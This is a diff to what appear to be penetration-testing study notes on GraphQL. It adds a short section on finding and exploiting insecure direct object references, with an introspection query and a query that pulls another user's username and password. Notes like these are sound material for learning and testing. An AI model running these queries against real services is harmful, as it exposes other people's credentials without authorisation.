@@ -135,3 +135,40 @@ git clone https://github.com/dolevf/graphw00f
 cd graphw00f
 python3 main.py -f -d -t http://STMIP:STMPO
 ```
+
+## Insecure Direct Object Reference (IDOR)
+
+### Identifying IDOR
+
+Replace a query value with another we know exist:
+![identifying idor](../images/idor_2.png)
+
+### Exploiting IDOR
+
+Replace query with introspection query to determine what data can be accessed (escape quotation marks on the below query)
+```json
+{
+  __type(name: "UserObject") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+```
+
+Adjust query to test if previously determined data fields are accessible
+
+```json
+{
+  user(username: "test") {
+    username
+    password
+  }
+}
+```
+
